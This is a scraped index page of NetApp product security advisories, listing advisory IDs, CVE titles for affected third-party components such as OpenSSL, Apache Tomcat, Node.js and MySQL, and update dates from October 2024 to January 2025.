* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)

## Security Advisories

NetAppâs available Security Advisories are listed below.

To receive notifications when new information is available for the latest 400 advisories, subscribe to the [RSS 2.0 feed](index.xml) using your preferred RSS reader.

Subscribe to receive email updates

close ×
#### Subscribe to all advisory updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to all advisory update alerts

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×
#### Unsubscribe from all advisory updates

Email

Unsubscribe

#### Unsubscribe from all advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

| ID | Title | Last Updated |
| --- | --- | --- |
| [**NTAP-20250124-0012**](https://security.netapp.com/advisory/ntap-20250124-0012/) | CVE-2024-11053 MySQL Enterprise Backup Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250124-0005**](https://security.netapp.com/advisory/ntap-20250124-0005/) | CVE-2024-13176 OpenSSL Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250124-0006**](https://security.netapp.com/advisory/ntap-20250124-0006/) | CVE-2024-38821 Spring Security Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250124-0007**](https://security.netapp.com/advisory/ntap-20250124-0007/) | CVE-2024-38827 Spring Security Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250124-0001**](https://security.netapp.com/advisory/ntap-20250124-0001/) | CVE-2024-45296 Node.js Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250124-0003**](https://security.netapp.com/advisory/ntap-20250124-0003/) | CVE-2024-52316 Apache Tomcat Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250124-0004**](https://security.netapp.com/advisory/ntap-20250124-0004/) | CVE-2024-52317 Apache Tomcat Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250124-0002**](https://security.netapp.com/advisory/ntap-20250124-0002/) | CVE-2024-52798 Node.js Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250124-0008**](https://security.netapp.com/advisory/ntap-20250124-0008/) | CVE-2025-0509 Java Platform Standard Edition Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250124-0011**](https://security.netapp.com/advisory/ntap-20250124-0011/) | CVE-2025-21492 MySQL Server Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250124-0009**](https://security.netapp.com/advisory/ntap-20250124-0009/) | CVE-2025-21502 Java Platform Standard Edition Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250124-0010**](https://security.netapp.com/advisory/ntap-20250124-0010/) | January 2025 MySQL 8.0.39, 8.4.2, and 9.0.1 Vulnerabilities in NetApp Products | 2025-01-24 |
| [**NTAP-20250124-0013**](https://security.netapp.com/advisory/ntap-20250124-0013/) | January 2025 MySQL 8.4.3 and 9.1.0 Vulnerabilities in NetApp Products | 2025-01-24 |
| [**NTAP-20250124-0014**](https://security.netapp.com/advisory/ntap-20250124-0014/) | January 2025 MySQL 9.1.0 Vulnerabilities in NetApp Products | 2025-01-24 |
| [**NTAP-20250117-0004**](https://security.netapp.com/advisory/ntap-20250117-0004/) | CVE-2021-3918 Json-schema Vulnerability in NetApp Products | 2025-01-17 |
| [**NTAP-20250117-0005**](https://security.netapp.com/advisory/ntap-20250117-0005/) | CVE-2023-0049 Vim Vulnerability in NetApp Products | 2025-01-17 |
| [**NTAP-20250117-0003**](https://security.netapp.com/advisory/ntap-20250117-0003/) | CVE-2023-41913 strongSwan Vulnerability in NetApp Products | 2025-01-17 |
| [**NTAP-20250117-0009**](https://security.netapp.com/advisory/ntap-20250117-0009/) | CVE-2023-52434 Linux Kernel Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250117-0001**](https://security.netapp.com/advisory/ntap-20250117-0001/) | CVE-2024-0690 Ansible Vulnerability in NetApp Products | 2025-01-17 |
| [**NTAP-20250117-0002**](https://security.netapp.com/advisory/ntap-20250117-0002/) | CVE-2024-21409 .NET Vulnerability in NetApp Products | 2025-01-17 |
| [**NTAP-20250117-0010**](https://security.netapp.com/advisory/ntap-20250117-0010/) | CVE-2024-29415 Node.js Vulnerability in NetApp Products | 2025-01-17 |
| [**NTAP-20250117-0006**](https://security.netapp.com/advisory/ntap-20250117-0006/) | CVE-2024-38807 Spring Boot Vulnerability in NetApp Products | 2025-01-17 |
| [**NTAP-20250117-0008**](https://security.netapp.com/advisory/ntap-20250117-0008/) | CVE-2024-39908 Ruby Vulnerability in NetApp Products | 2025-01-17 |
| [**NTAP-20250117-0007**](https://security.netapp.com/advisory/ntap-20250117-0007/) | CVE-2024-41946 Ruby Vulnerability in NetApp Products | 2025-01-17 |
| [**NTAP-20250110-0004**](https://security.netapp.com/advisory/ntap-20250110-0004/) | CVE-2024-10005 HashiCorp Consul Vulnerability in NetApp Products | 2025-01-10 |
| [**NTAP-20250110-0005**](https://security.netapp.com/advisory/ntap-20250110-0005/) | CVE-2024-10006 HashiCorp Consul Vulnerability in NetApp Products | 2025-01-10 |
| [**NTAP-20250110-0006**](https://security.netapp.com/advisory/ntap-20250110-0006/) | CVE-2024-10086 HashiCorp Consul Vulnerability in NetApp Products | 2025-01-10 |
| [**NTAP-20250110-0003**](https://security.netapp.com/advisory/ntap-20250110-0003/) | CVE-2024-10979 PostgreSQL Vulnerability in NetApp Products | 2025-01-10 |
| [**NTAP-20250110-0010**](https://security.netapp.com/advisory/ntap-20250110-0010/) | CVE-2024-38819 Spring Framework Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250110-0002**](https://security.netapp.com/advisory/ntap-20250110-0002/) | CVE-2024-39281 FreeBSD Vulnerability in NetApp Products | 2025-01-10 |
| [**NTAP-20250110-0001**](https://security.netapp.com/advisory/ntap-20250110-0001/) | CVE-2024-45289 FreeBSD Vulnerability in NetApp Products | 2025-01-10 |
| [**NTAP-20250110-0007**](https://security.netapp.com/advisory/ntap-20250110-0007/) | CVE-2024-7594 HashiCorp Vault Vulnerability in NetApp Products | 2025-01-10 |
| [**NTAP-20250110-0008**](https://security.netapp.com/advisory/ntap-20250110-0008/) | CVE-2024-8929 PHP Vulnerability in NetApp Products | 2025-01-10 |
| [**NTAP-20250110-0009**](https://security.netapp.com/advisory/ntap-20250110-0009/) | CVE-2024-8932 PHP Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20250103-0008**](https://security.netapp.com/advisory/ntap-20250103-0008/) | CVE-2016-10229 Linux Kernel Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250103-0010**](https://security.netapp.com/advisory/ntap-20250103-0010/) | CVE-2017-18017 Linux Kernel Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250103-0009**](https://security.netapp.com/advisory/ntap-20250103-0009/) | CVE-2023-38429 Linux Kernel Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20250103-0006**](https://security.netapp.com/advisory/ntap-20250103-0006/) | CVE-2024-43398 Ruby Vulnerability in NetApp Products | 2025-01-03 |
| [**NTAP-20250103-0004**](https://security.netapp.com/advisory/ntap-20250103-0004/) | CVE-2024-45802 Squid Vulnerability in NetApp Products | 2025-01-06 |
| [**NTAP-20250103-0007**](https://security.netapp.com/advisory/ntap-20250103-0007/) | CVE-2024-49767 Werkzeug Vulnerability in NetApp Products | 2025-01-03 |
| [**NTAP-20250103-0003**](https://security.netapp.com/advisory/ntap-20250103-0003/) | CVE-2024-50379 Apache Tomcat Vulnerability in NetApp Products | 2025-01-17 |
| [**NTAP-20250103-0001**](https://security.netapp.com/advisory/ntap-20250103-0001/) | CVE-2024-52046 Apache MINA Vulnerability in NetApp Products | 2025-01-03 |
| [**NTAP-20250103-0005**](https://security.netapp.com/advisory/ntap-20250103-0005/) | CVE-2024-53677 Apache Struts Vulnerability in NetApp Products | 2025-01-03 |
| [**NTAP-20250103-0002**](https://security.netapp.com/advisory/ntap-20250103-0002/) | CVE-2024-56337 Apache Tomcat Vulnerability in NetApp Products | 2025-01-17 |
| [**NTAP-20241227-0009**](https://security.netapp.com/advisory/ntap-20241227-0009/) | CVE-2017-12588 Rsyslog Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241227-0007**](https://security.netapp.com/advisory/ntap-20241227-0007/) | CVE-2017-8923 PHP Vulnerability in NetApp Products | 2024-12-27 |
| [**NTAP-20241227-0008**](https://security.netapp.com/advisory/ntap-20241227-0008/) | CVE-2018-12121 Node.js Vulnerability in NetApp Products | 2024-12-27 |
| [**NTAP-20241227-0010**](https://security.netapp.com/advisory/ntap-20241227-0010/) | CVE-2018-20060 urllib3 Vulnerability in NetApp Products | 2024-12-27 |
| [**NTAP-20241227-0006**](https://security.netapp.com/advisory/ntap-20241227-0006/) | CVE-2023-52439 Linux Kernel Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241227-0002**](https://security.netapp.com/advisory/ntap-20241227-0002/) | CVE-2024-3056 Podman Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241227-0001**](https://security.netapp.com/advisory/ntap-20241227-0001/) | CVE-2024-38816 Spring Framework Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241227-0005**](https://security.netapp.com/advisory/ntap-20241227-0005/) | CVE-2024-41123 Ruby Vulnerability in NetApp Products | 2024-12-27 |
| [**NTAP-20241227-0003**](https://security.netapp.com/advisory/ntap-20241227-0003/) | CVE-2024-48949 Node.js Vulnerability in NetApp Products | 2024-12-27 |
| [**NTAP-20241227-0004**](https://security.netapp.com/advisory/ntap-20241227-0004/) | CVE-2024-49761 Ruby Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241220-0007**](https://security.netapp.com/advisory/ntap-20241220-0007/) | CVE-2019-17546 LibTIFF Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241220-0006**](https://security.netapp.com/advisory/ntap-20241220-0006/) | CVE-2020-21583 Util-linux Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241220-0009**](https://security.netapp.com/advisory/ntap-20241220-0009/) | CVE-2023-29403 Golang Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241220-0005**](https://security.netapp.com/advisory/ntap-20241220-0005/) | CVE-2024-0985 PostgreSQL Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241220-0001**](https://security.netapp.com/advisory/ntap-20241220-0001/) | CVE-2024-26633 Linux Kernel Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241220-0002**](https://security.netapp.com/advisory/ntap-20241220-0002/) | CVE-2024-26882 Linux Kernel Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241220-0003**](https://security.netapp.com/advisory/ntap-20241220-0003/) | CVE-2024-45663 IBM Db2 Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241220-0004**](https://security.netapp.com/advisory/ntap-20241220-0004/) | CVE-2024-48948 Node.js Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241220-0010**](https://security.netapp.com/advisory/ntap-20241220-0010/) | CVE-2024-9407 Podman Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241220-0008**](https://security.netapp.com/advisory/ntap-20241220-0008/) | November 2024 PHP Vulnerabilities in NetApp Products | 2024-12-20 |
| [**NTAP-20241213-0003**](https://security.netapp.com/advisory/ntap-20241213-0003/) | CVE-2017-9217 Systemd Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241213-0009**](https://security.netapp.com/advisory/ntap-20241213-0009/) | CVE-2018-12122 Node.js Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241213-0008**](https://security.netapp.com/advisory/ntap-20241213-0008/) | CVE-2018-12123 Node.js Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241213-0002**](https://security.netapp.com/advisory/ntap-20241213-0002/) | CVE-2018-7738 Util-linux Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241213-0005**](https://security.netapp.com/advisory/ntap-20241213-0005/) | CVE-2023-29400 Golang Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241213-0004**](https://security.netapp.com/advisory/ntap-20241213-0004/) | CVE-2023-29402 Golang Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241213-0007**](https://security.netapp.com/advisory/ntap-20241213-0007/) | CVE-2023-43804 urllib3 Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241213-0001**](https://security.netapp.com/advisory/ntap-20241213-0001/) | CVE-2024-29131 Apache Commons Configuration Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20241213-0010**](https://security.netapp.com/advisory/ntap-20241213-0010/) | CVE-2024-7254 Protobuf-java Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20241213-0006**](https://security.netapp.com/advisory/ntap-20241213-0006/) | CVE-2024-9681 curl Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241206-0010**](https://security.netapp.com/advisory/ntap-20241206-0010/) | CVE-2019-12749 D-Bus Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241206-0004**](https://security.netapp.com/advisory/ntap-20241206-0004/) | CVE-2023-27561 runc Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20241206-0005**](https://security.netapp.com/advisory/ntap-20241206-0005/) | CVE-2023-28642 runc Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20241206-0003**](https://security.netapp.com/advisory/ntap-20241206-0003/) | CVE-2023-29405 Golang Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241206-0007**](https://security.netapp.com/advisory/ntap-20241206-0007/) | CVE-2023-42366 Busybox Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241206-0002**](https://security.netapp.com/advisory/ntap-20241206-0002/) | CVE-2024-28103 Ruby on Rails Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20241206-0008**](https://security.netapp.com/advisory/ntap-20241206-0008/) | CVE-2024-29857 Bouncy Castle Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20241206-0006**](https://security.netapp.com/advisory/ntap-20241206-0006/) | CVE-2024-38796 Tianocore EDK2 Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20241206-0001**](https://security.netapp.com/advisory/ntap-20241206-0001/) | CVE-2024-39689 Certifi Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20241206-0009**](https://security.netapp.com/advisory/ntap-20241206-0009/) | CVE-2024-52533 Gnome Glib Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241129-0002**](https://security.netapp.com/advisory/ntap-20241129-0002/) | CVE-2022-2795 ISC BIND Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241129-0001**](https://security.netapp.com/advisory/ntap-20241129-0001/) | CVE-2022-48174 Busybox Vulnerability in NetApp Products | 2025-01-06 |
| [**NTAP-20241129-0004**](https://security.netapp.com/advisory/ntap-20241129-0004/) | CVE-2023-24537 Golang Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241129-0005**](https://security.netapp.com/advisory/ntap-20241129-0005/) | CVE-2023-24539 Golang Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241129-0006**](https://security.netapp.com/advisory/ntap-20241129-0006/) | CVE-2023-2610 Vim Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241129-0011**](https://security.netapp.com/advisory/ntap-20241129-0011/) | CVE-2023-31486 Perl Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20241129-0010**](https://security.netapp.com/advisory/ntap-20241129-0010/) | CVE-2023-34042 Spring Security Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241129-0012**](https://security.netapp.com/advisory/ntap-20241129-0012/) | CVE-2023-6378 Logback Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20241129-0003**](https://security.netapp.com/advisory/ntap-20241129-0003/) | CVE-2024-38820 Spring Framework Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241129-0007**](https://security.netapp.com/advisory/ntap-20241129-0007/) | CVE-2024-41957 Vim Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241129-0009**](https://security.netapp.com/advisory/ntap-20241129-0009/) | CVE-2024-6162 Undertow Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20241129-0008**](https://security.netapp.com/advisory/ntap-20241129-0008/) | CVE-2024-6197 curl Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241122-0010**](https://security.netapp.com/advisory/ntap-20241122-0010/) | CVE-2022-1304 E2fsprogs Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241122-0004**](https://security.netapp.com/advisory/ntap-20241122-0004/) | CVE-2023-7008 Systemd Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241122-0007**](https://security.netapp.com/advisory/ntap-20241122-0007/) | CVE-2024-1442 Grafana Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20241122-0008**](https://security.netapp.com/advisory/ntap-20241122-0008/) | CVE-2024-1459 Undertow Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20241122-0006**](https://security.netapp.com/advisory/ntap-20241122-0006/) | CVE-2024-22020 Node.js Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20241122-0009**](https://security.netapp.com/advisory/ntap-20241122-0009/) | CVE-2024-28835 GNU TLS Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241122-0001**](https://security.netapp.com/advisory/ntap-20241122-0001/) | CVE-2024-30045 .NET Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241122-0005**](https://security.netapp.com/advisory/ntap-20241122-0005/) | CVE-2024-36137 Node.js Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20241122-0002**](https://security.netapp.com/advisory/ntap-20241122-0002/) | CVE-2024-8372 AngularJS Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241122-0003**](https://security.netapp.com/advisory/ntap-20241122-0003/) | CVE-2024-8373 AngularJS Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241122-0011**](https://security.netapp.com/advisory/ntap-20241122-0011/) | July 2024 7-Zip Vulnerabilities in NetApp Products | 2024-12-06 |
| [**NTAP-20241115-0004**](https://security.netapp.com/advisory/ntap-20241115-0004/) | CVE-2022-0318 Vim Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241115-0010**](https://security.netapp.com/advisory/ntap-20241115-0010/) | CVE-2022-3520 Vim Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241115-0007**](https://security.netapp.com/advisory/ntap-20241115-0007/) | CVE-2023-24538 Golang Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241115-0008**](https://security.netapp.com/advisory/ntap-20241115-0008/) | CVE-2023-24540 Golang Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241115-0009**](https://security.netapp.com/advisory/ntap-20241115-0009/) | CVE-2023-29404 Golang Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241115-0006**](https://security.netapp.com/advisory/ntap-20241115-0006/) | CVE-2024-25744 Linux Kernel Vulnerability in NetApp Products | 2025-01-06 |
| [**NTAP-20241115-0003**](https://security.netapp.com/advisory/ntap-20241115-0003/) | CVE-2024-29736 Apache CXF Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241115-0005**](https://security.netapp.com/advisory/ntap-20241115-0005/) | CVE-2024-38428 GNU Wget Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241115-0002**](https://security.netapp.com/advisory/ntap-20241115-0002/) | CVE-2024-41965 Vim Vulnerability in NetApp Products | 2025-01-14 |
| [**NTAP-20241115-0001**](https://security.netapp.com/advisory/ntap-20241115-0001/) | CVE-2024-6384 MongoDB Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20241108-0005**](https://security.netapp.com/advisory/ntap-20241108-0005/) | CVE-2023-30584 Node.js Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20241108-0004**](https://security.netapp.com/advisory/ntap-20241108-0004/) | CVE-2023-30587 Node.js Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20241108-0001**](https://security.netapp.com/advisory/ntap-20241108-0001/) | CVE-2024-21994 Denial of Service Vulnerability in StorageGRID (formerly StorageGRID Webscale) | 2024-11-08 |
| [**NTAP-20241108-0008**](https://security.netapp.com/advisory/ntap-20241108-0008/) | CVE-2024-26641 Linux Kernel Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241108-0010**](https://security.netapp.com/advisory/ntap-20241108-0010/) | CVE-2024-36138 Node.js Vulnerability in NetApp Products | 2024-11-08 |
| [**NTAP-20241108-0007**](https://security.netapp.com/advisory/ntap-20241108-0007/) | CVE-2024-37370 MIT Kerberos 5 Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241108-0009**](https://security.netapp.com/advisory/ntap-20241108-0009/) | CVE-2024-37371 MIT Kerberos 5 Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241108-0006**](https://security.netapp.com/advisory/ntap-20241108-0006/) | CVE-2024-8612 QEMU Vulnerability in NetApp Products | 2024-11-08 |
| [**NTAP-20241108-0003**](https://security.netapp.com/advisory/ntap-20241108-0003/) | Intel SA-00999 CSME Vulnerabilities in NetApp Products | 2024-11-08 |
| [**NTAP-20241108-0002**](https://security.netapp.com/advisory/ntap-20241108-0002/) | June 2024 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2024-11-08 |
| [**NTAP-20241101-0004**](https://security.netapp.com/advisory/ntap-20241101-0004/) | CVE-2023-49582 Apache Portable Runtime (APR) Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20241101-0007**](https://security.netapp.com/advisory/ntap-20241101-0007/) | CVE-2024-21200 MySQL Server Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20241101-0009**](https://security.netapp.com/advisory/ntap-20241101-0009/) | CVE-2024-21204 MySQL Server Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20241101-0005**](https://security.netapp.com/advisory/ntap-20241101-0005/) | CVE-2024-21209 MySQL Client Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20241101-0006**](https://security.netapp.com/advisory/ntap-20241101-0006/) | CVE-2024-21247 MySQL Client Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20241101-0002**](https://security.netapp.com/advisory/ntap-20241101-0002/) | CVE-2024-23454 Apache Hadoop Vulnerability in NetApp Products | 2024-11-01 |
| [**NTAP-20241101-0013**](https://security.netapp.com/advisory/ntap-20241101-0013/) | CVE-2024-26733 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20241101-0012**](https://security.netapp.com/advisory/ntap-20241101-0012/) | CVE-2024-26735 Linux Kernel Vulnerability in NetApp Products | 2024-11-22 |
| [**NTAP-20241101-0010**](https://security.netapp.com/advisory/ntap-20241101-0010/) | CVE-2024-38286 Apache Tomcat Vulnerability in NetApp Products | 2025-01-17 |
| [**NTAP-20241101-0001**](https://security.netapp.com/advisory/ntap-20241101-0001/) | CVE-2024-9143 OpenSSL Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241101-0011**](https://security.netapp.com/advisory/ntap-20241101-0011/) | June 2023 Node.js Vulnerabilities in NetApp Products | 2024-11-01 |
| [**NTAP-20241101-0008**](https://security.netapp.com/advisory/ntap-20241101-0008/) | October 2024 MySQL Server 8.4.2 and 9.0.1 Vulnerabilities in NetApp Products | 2024-12-06 |
| [**NTAP-20241101-0003**](https://security.netapp.com/advisory/ntap-20241101-0003/) | October 2024 PHP Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20241025-0004**](https://security.netapp.com/advisory/ntap-20241025-0004/) | CVE-2022-25883 Node.js Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20241025-0003**](https://security.netapp.com/advisory/ntap-20241025-0003/) | CVE-2023-32558 Node.js Vulnerability in NetApp Products | 2024-10-30 |
| [**NTAP-20241025-0002**](https://security.netapp.com/advisory/ntap-20241025-0002/) | CVE-2023-4237 Ansible Vulnerability in NetApp Products | 2024-10-25 |
| [**NTAP-20241025-0001**](https://security.netapp.com/advisory/ntap-20241025-0001/) | CVE-2023-5764 Ansible Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20241025-0007**](https://security.netapp.com/advisory/ntap-20241025-0007/) | CVE-2024-21207 MySQL Server Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20241025-0008**](https://security.netapp.com/advisory/ntap-20241025-0008/) | CVE-2024-21212 MySQL Server Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20241025-0009**](https://security.netapp.com/advisory/ntap-20241025-0009/) | CVE-2024-21238 MySQL Server Vulnerability in NetApp Products | 2024-12-06 |
| [**NTAP-20241025-0005**](https://security.netapp.com/advisory/ntap-20241025-0005/) | October 2024 MySQL Connector/ODBC Vulnerabilities in NetApp Products | 2024-10-25 |
| [**NTAP-20241025-0010**](https://security.netapp.com/advisory/ntap-20241025-0010/) | October 2024 MySQL Enterprise Backup Vulnerabilities in NetApp Products | 2024-12-06 |
| [**NTAP-20241025-0006**](https://security.netapp.com/advisory/ntap-20241025-0006/) | October 2024 MySQL Server 8.0.39, 8.4.2, 9.0.1 Vulnerabilities in NetApp Products | 2024-12-06 |
| [**NTAP-20241018-0008**](https://security.netapp.com/advisory/ntap-20241018-0008/) | CVE-2024-21211 Java Platform Standard Edition Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20241018-0001**](https://security.netapp.com/advisory/ntap-20241018-0001/) | CVE-2024-36883 Linux Kernel Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241018-0002**](https://security.netapp.com/advisory/ntap-20241018-0002/) | CVE-2024-36886 Linux Kernel Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241018-0004**](https://security.netapp.com/advisory/ntap-20241018-0004/) | CVE-2024-45490 libexpat Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241018-0003**](https://security.netapp.com/advisory/ntap-20241018-0003/) | CVE-2024-45491 libexpat Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241018-0005**](https://security.netapp.com/advisory/ntap-20241018-0005/) | CVE-2024-45492 libexpat Vulnerability in NetApp Products | 2024-12-20 |
| [**NTAP-20241018-0007**](https://security.netapp.com/advisory/ntap-20241018-0007/) | CVE-2024-6232 Python Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20241018-0006**](https://security.netapp.com/advisory/ntap-20241018-0006/) | CVE-2024-7592 Python Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20241018-0009**](https://security.netapp.com/advisory/ntap-20241018-0009/) | October 2024 Java Platform Standard Edition 8u421 Vulnerabilities in NetApp Products | 2024-10-30 |
| [**NTAP-20241018-0010**](https://security.netapp.com/advisory/ntap-20241018-0010/) | October 2024 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2024-12-04 |
| [**NTAP-20241011-0007**](https://security.netapp.com/advisory/ntap-20241011-0007/) | CVE-2024-27282 Ruby Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20241011-0006**](https://security.netapp.com/advisory/ntap-20241011-0006/) | CVE-2024-41909 Apache MINA SSHD Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20241011-0003**](https://security.netapp.com/advisory/ntap-20241011-0003/) | CVE-2024-47561 Apache Avro Vulnerability in NetApp Products | 2024-10-24 |
| [**NTAP-20241011-0002**](https://security.netapp.com/advisory/ntap-20241011-0002/) | CVE-2024-47850 CUPS Vulnerability in NetApp Products | 2025-01-24 |
| [**NTAP-20241011-0004**](https://security.netapp.com/advisory/ntap-20241011-0004/) | CVE-2024-7885 Undertow Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20241011-0010**](https://security.netapp.com/advisory/ntap-20241011-0010/) | CVE-2024-8088 Python Vulnerability in NetApp Products | 2024-12-13 |
| [**NTAP-20241011-0005**](https://security.netapp.com/advisory/ntap-20241011-0005/) | CVE-2024-8096 curl Vulnerability in NetApp Products | 2024-10-24 |
| [**NTAP-20241011-0008**](https://security.netapp.com/advisory/ntap-20241011-0008/) | CVE-2024-8354 QEMU Vulnerability in NetApp Products | 2024-10-24 |
| [**NTAP-20241011-0009**](https://security.netapp.com/advisory/ntap-20241011-0009/) | Intel SA-01071 UEFI Vulnerabilities in NetApp Products | 2024-10-11 |
| [**NTAP-20241011-0001**](https://security.netapp.com/advisory/ntap-20241011-0001/) | September 2024 CUPS Vulnerabilities in NetApp Products | 2024-12-06 |
| [**NTAP-20241004-0005**](https://security.netapp.com/advisory/ntap-20241004-0005/) | August 2024 Node.js Elliptic Vulnerabilities in NetApp Products | 2024-10-07 |
